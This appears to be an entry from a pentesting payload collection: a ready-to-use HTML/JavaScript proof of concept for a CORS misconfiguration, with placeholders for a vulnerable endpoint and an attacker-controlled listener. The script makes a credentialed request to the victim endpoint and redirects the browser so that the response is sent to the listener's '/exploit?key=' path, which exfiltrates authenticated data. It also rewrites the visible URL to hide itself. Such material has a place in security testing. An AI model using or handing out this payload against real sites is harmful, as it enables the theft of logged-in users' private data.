
`{ENDPOINT}` - Vulnerable endpoint address<br>
`{MyServer}` - Collaborator/Listener address

```html
<html>
  <body>
  <script>history.pushState('', '', '/')</script>
    <script>
      function submitRequest()
      {
        var req = new XMLHttpRequest();
        req.onload = reqListener;
        req.open('get','{ENDPOINT}',true);
        req.withCredentials = true;
        req.send();

        function reqListener() {
        location='{My_Server}/exploit?key='+this.responseText;
};
      }
      submitRequest();
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```
